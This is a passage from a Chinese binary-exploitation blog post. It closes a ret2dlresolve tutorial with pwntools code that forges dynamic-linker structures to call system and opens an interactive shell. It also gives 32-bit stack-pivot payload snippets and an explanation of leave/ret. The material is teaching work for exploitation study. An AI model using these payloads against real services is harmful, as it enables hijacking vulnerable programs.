class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) <span class="comment">#addr_bss+20	-&gt; &#x27;system&#x27;</span></span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"><span class="comment">#----------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">buf3 = <span class="string">&#x27;A&#x27;</span>*offset + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>32位依照这样打就可以了，但64位在这种情况下，如果像32位一样依次伪造reloc，symtab，strtab，会出错，原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址处 </p>
<p>本篇博客重点介绍原理，所以就不介绍64位的情况了</p>
<p>今后我会在实战中</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/15168342.htm">https://www.cnblogs.com/unr4v31/p/15168342.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184099#h3-2">https://www.anquanke.com/post/id/184099#h3-2</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a>  （核心）</p>
<hr>
<p><strong>PS：</strong></p>
<p>为什么程序会调用“aaaa”呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(read_plt)      		</span><br><span class="line">payload += p32(leave_ret)		</span><br><span class="line">payload += p32(<span class="number">0</span>)					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(<span class="number">100</span>)	</span><br></pre></td></tr></table></figure>
<p><strong>read_plt</strong>执行过程中，会输入新的payload到bss_stage中，执行结束后会返回<strong>leave_ret</strong></p>
<p>这里的关键就是<strong>leave_ret</strong>，汇编语言leave本身会“pop ebp”一次，然后ret又一次“pop”控制ip指针</p>
<p>1.leave把bss_stage变为新的ebp，然后重置sp指针，这时bss_stage就是<strong>新的栈</strong>了</p>
<p>2.ret则会把<strong>新的栈</strong>中的栈顶弹入ip指针</p>
<p>而<strong>read_plt</strong>已经提前在它之中写入了数据：（节选）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>						  </span><br><span class="line">payload += p32(plt_0) 						</span><br><span class="line">payload += p32(index_offset) </span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(bss_stage+<span class="number">80</span>) </span><br></pre></td></tr></table></figure>
<p>所以指令ret会把 <strong>‘aaaa’</strong> 弹到ip寄存器中，而程序没法识别 <strong>‘aaaa’</strong> ，所以会把它当成一个新的函数，然后会调用 <strong>ret2dlresolve</strong> 去尝试重定位这个函数，这时伪装就成功了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/32/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><span class="page-number current">33</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/34/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
